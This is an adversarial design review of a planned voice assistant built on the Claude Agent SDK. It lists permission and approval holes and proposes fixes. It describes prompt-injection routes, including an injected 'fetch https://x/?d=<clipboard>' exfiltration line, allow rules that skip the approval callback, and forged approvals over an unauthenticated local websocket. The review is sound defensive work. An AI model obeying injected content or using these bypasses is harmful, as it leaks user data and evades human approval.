# Adversarial review: voice assistant PLAN.md (rev 4) and flow mock

_2026-11-16. Reviewed against current Claude Code / Agent SDK docs, Apple and Rive docs, and the cloned reference repos. Nothing was run or measured; "unverified" means I found no authoritative source._

## Verdict

The architecture (Swift app for audio and UI, small text-only core, approvals in the core) is sound, and the "never stuck" design (§5.9) is the strongest part. But the plan is **not ready to build**: priority 2 ("never act on a write without approval") has four holes, two of which bypass the approval card entirely, and the echo-cancellation claim that the whole no-headphones design rests on is wrong as written. Several §2.1 numbers contradict the mock or each other, phases 0–1 still describe the pre-rev-4 Python audio design, and phase 3 is about three phases of work. Fix the four Blocking items and re-scope phase 0 around them before writing code.

## Blocking

**B1. Settings allow rules approve tools before `can_use_tool` is ever called** (§3 step 5, §7 Approval rule).
The SDK evaluates: hooks → deny rules → ask rules → permission mode → **allow rules (`allowed_tools` and settings.json)** → `can_use_tool`. A matching allow rule approves the tool and the callback never fires. The plan deliberately loads global and per-repo settings (§2 "plugins and connectors still load", §5.3), so any `Bash(...)`, `Edit` or `mcp__…` allow rule in user or repo settings runs with no card. Source: https://code.claude.com/docs/en/agent-sdk/permissions (the page names the project source; user-level settings are unverified but must be assumed).
*Change:* make the gate something that runs first: a `PreToolUse` hook that denies or forces "ask" for anything not on the assistant's own list, with `can_use_tool` only as the UI path. Phase 0 test: put `Bash(touch:*)` in a repo's settings and confirm the card still appears.

**B2. "MCP tools whose names are read verbs" plus free WebFetch is an exfiltration path** (§7 Approval rule, §4, §5.2, §5.6).
A name is not a contract: `query` can run SQL, `fetch` can hit any URL, and connectors here include names like `get_file_upload_url` and `run_…`. Separately, screen text, dropped files and Slack/Jira/email content are untrusted, and WebFetch, `get_clipboard` and `get_frontmost` are all allowlisted, so an injected "fetch https://x/?d=<clipboard>" needs no approval.
*Change:* exact-name allowlist per tool (use MCP `readOnlyHint` only as a suggestion when building it). `get_clipboard` asks. Once a turn has ingested untrusted content, WebFetch/`open_url` to a domain not already seen in the user's own utterance asks.

**B3. The app↔core websocket has no authentication** (§3 protocol).
Any local process, and any web page (browsers allow `ws://127.0.0.1` cross-origin), can send `approval {id, approved: true}`, `utterance` or `answer`. That is a remote approval bypass.
*Change:* drop the websocket. The app spawns the core, so use stdin/stdout JSON lines (or a Unix socket in a 0700 directory). This also removes the `websockets` dependency and the port from `config.toml`. Fix the header too: it still says "JSON + binary audio frames".

**B4. "One engine handles both mic and speaker, so echo cancellation is free" is wrong for AVSpeechSynthesizer** (§2.1, §3).
Voice processing only cancels audio rendered through the same engine's output; `AVSpeechSynthesizer.speak` plays through its own route and is not subtracted. Sources: WWDC19 session 510 (https://developer.apple.com/videos/play/wwdc2019/510/); Apple forum threads on synthesiser buffers through `AVAudioPlayerNode` report problems (https://developer.apple.com/forums/thread/742683).
*Change:* synthesise with `write(_:toBufferCallback:)` into a player node on the voice-processing engine (also gives the mouth its level). Make exactly this, with a Premium voice and built-in speakers, the first phase 0 test. Fallback: half-duplex (stop listening while speaking, wake word excepted), which also lets barge-in be cut.

## Should fix

**S1. The approval summary must not come from Claude; voice "yes" is too weak for high-risk actions** (§3 step 5, mock "Approve a write").
If the model writes `summary`, injected content can misdescribe the action. An open mic also accepts "yes" from a video, a colleague, or a stale reply to the previous card.
*Change:* the core renders the card from tool name and raw input (per-tool renderers, raw JSON fallback). Accept voice only when the utterance starts after the prompt finishes and matches the request id; require a click for Bash, deletes, and all job approvals.

**S2. Job policy "edits and commits inside the repo allowed" is undefined and self-escalating** (§5.1, mock "Background job").
Commits need Bash; the plan gives no Bash rule. In-repo edits include `.claude/settings.json`, `.git/hooks` and `CLAUDE.md`, which feed B1. The mock chat shows `Bash git diff … (approved)` with no approval step.
*Change:* run jobs in a git worktree; deny writes to `.claude/`, `.git/` and outside the worktree; Bash asks except an exact-argv allowlist (`git add/commit/diff/status`).

**S3. §2.1 numbers that will not hold or are ill-defined.**
- *Wake → chime ≤150 ms* includes a second-pass speech-to-text check on ~1 s of audio (mock repeats it). Either chime before confirming or budget ~500 ms.
- *End of speech → ack ≤300 ms*: the mock says a 0.7 s pause ends the turn, so perceived delay is ~1 s. Define the clock start.
- *Cached acknowledgements* vs the mock's "Checking your calendar…", "Pulling your tickets…": content-specific acks cannot be cached or known before routing.
- *Core ≤50 MB*: `claude-agent-sdk` pulls in `mcp`, pydantic and anyio; expect more (unverified, measure in phase 0).
- *App ≤60 MB* with ONNX Runtime, Rive/Metal and SwiftUI is tight.
- *"Wake word about 200 KB"*: the head is 205 KB, but the pipeline also loads `melspectrogram.onnx` and `embedding_model.onnx` (hey-claude `src/hey_claude/wake.py:74-82`).
- *Chat window with 1,000 messages ≤150 ms* in native Markdown needs virtualisation; it is not free.
- *"Speech-to-text starts instantly, no model"*: SpeechAnalyzer assets download on first use, and en-IN support and custom vocabulary for `SpeechTranscriber` are unconfirmed.

**S4. The router adds a Claude call before every conversation** (§3 step 3, §7).
Through the SDK that means a CLI start plus a round trip, likely seconds, in front of the first answer. "Excluded from the baseline" hides a design cost.
*Change:* decide locally first (active session under 30 min → continue; alias match → cwd) and call the router only for "resume…"/ambiguous cases. On resume, use the session's stored `cwd`, not a new one.

**S5. Rev 4 was not carried through the plan.**
Phase 0 installs VoiceMode's whisper/Kokoro; phase 1 builds wake → VAD → STT → TTS in Python, which phase 2 throws away; §6 still says "Core: wake / speech output"; §7 says "macOS 14+" while SpeechAnalyzer needs macOS 26.
*Change:* phase 1 = Swift audio command-line spike plus the text core over stdio.

**S6. Call detection and mic sharing** (§5.4, §5.5, mock "Morning + quiet").
The app itself always holds the mic, so "device is running somewhere" is always true; it needs per-process input detection. Two apps with voice processing on at once is a known trouble spot (https://developer.apple.com/forums/thread/751100).
*Change:* during calls, stop the engine entirely (no wake word), not just speech.

**S7. Auto take-back after 30 min of transcript silence creates two writers** (§5.10, mock "Sessions + handoff").
An idle terminal still owns the session. *Change:* never auto take back; on "Take back", fork.

**S8. Paste safety** (§5.8). Re-check the frontmost app/field before ⌘V; strip trailing newlines (a newline in a terminal executes); restore the previous clipboard.

**S9. Subscription terms are narrower than the plan assumes** (§9). Current wording covers "ordinary, individual usage of Claude Code and the Agent SDK"; products must use API keys. Personal local use looks allowed; round-the-clock watchers and briefings push on "ordinary". Keep Claude calls user-initiated by default and never distribute the app with subscription login.

## Consider

- **C1. Cut or defer:** the built-in chat window (a full transcript renderer; Open in Terminal already is the escape hatch), MCP elicitation forms, Open in desktop app, dot colours/hover on the ring (keep one badge), Kokoro/Whisper paths, Performance view, 8-hour soak, meeting follow-up, worklogs, Grafana/pod watchers.
- **C2. Split phase 3** into (a) approvals + pending input + Open in Terminal, (b) router + index, (c) panels + quiet mode. Safety first.
- **C3. Don't port openWakeWord by hand.** LiveKit's `livekit-wakeword` Swift package runs the same mel + embedding front-end on ONNX Runtime for macOS 14+ (https://github.com/livekit/livekit-wakeword); check its licence and whether it loads `hey_claude.onnx`.
- **C4. Phase 0 is more than one day** (22 open items). Order: B1 test, B4 test, SpeechAnalyzer accuracy on your speech, connectors in an SDK session, wake word in Swift, footprint.
- **C5. State the real footprint once.** Each live SDK session is a Claude Code process; conversation + pre-warm + 2 jobs is several hundred MB the budget defines away.
- **C6. Core restart** with approvals pending: specify "all pending → deny, sessions → resumable".

## Technical claims

| Claim | Status | Source |
|---|---|---|
| `AskUserQuestion` arrives through `can_use_tool`; answer returned as `updated_input` with `answers` | Verified | code.claude.com/docs/en/agent-sdk/user-input |
| Callback may wait for hours (4 h job timeout) | Verified ("can stay pending indefinitely") | same |
| Python `can_use_tool` works with a plain prompt | Wrong: needs streaming input and a dummy `PreToolUse` hook | same (example comment) |
| `ExitPlanMode` arrives through `can_use_tool` | Unverifiable (not documented) | same |
| `AskUserQuestion` works everywhere | Wrong for subagents | same |
| `can_use_tool` sees every write | Wrong (allow rules run first) | …/agent-sdk/permissions |
| `resume` / `fork_session`; real ids work with `claude --resume` | Verified; resume from any cwd since v2.1.223 | …/agent-sdk/sessions |
| In-process SDK MCP servers alongside other servers | Verified (same `mcpServers` map) | …/agent-sdk/custom-tools, /mcp |
| claude.ai connectors load in SDK sessions | Implied, not stated | …/agent-sdk/permissions |
| MCP elicitation exposed by the SDK | Unverifiable | …/agent-sdk/mcp |
| SDK uses the subscription login | Unverifiable from docs (overview says "set your API key") | …/agent-sdk/overview |
| Terms allow personal SDK use on Pro/Max | Verified with limits (S9) | code.claude.com/docs/en/legal-and-compliance |
| SpeechAnalyzer on macOS 26, on-device, streaming | Verified; en-IN and custom vocabulary unverified | developer.apple.com/documentation/speech |
| RiveRuntime renders natively on macOS | Verified (macOS 13.1+, AppKit/SwiftUI); transparent panel unverified | rive.app/docs/runtimes/apple |
| Voice processing gives free echo cancellation for the synthesiser | Wrong as written (B4) | WWDC19-510 |
| openWakeWord runs in Swift | Verified via ONNX Runtime (C3) | livekit-wakeword |
| Desktop app can open SDK/CLI sessions | Wrong today: its sidebar lists only its own sessions | github.com/anthropics/claude-code/issues/58670, /43786 |
| Reused repos are MIT; Claude_Chat has no licence | Verified | LICENSE files in the clones |

## Keep

- Text-only core, all audio in the app, native UI.
- Deny on timeout or unclear answer; never `bypassPermissions`.
- The pending-input table and "every panel has a way out" (§5.9); passwords never through the assistant.
- Real session ids so `claude --resume` always works.
- Fixed Rive inputs so the character is swappable; ring drawn by the app.
- Job cap, Keychain for tokens, "never presses Send", screenshots only on approval.
- Measuring with signposts rather than guessing.
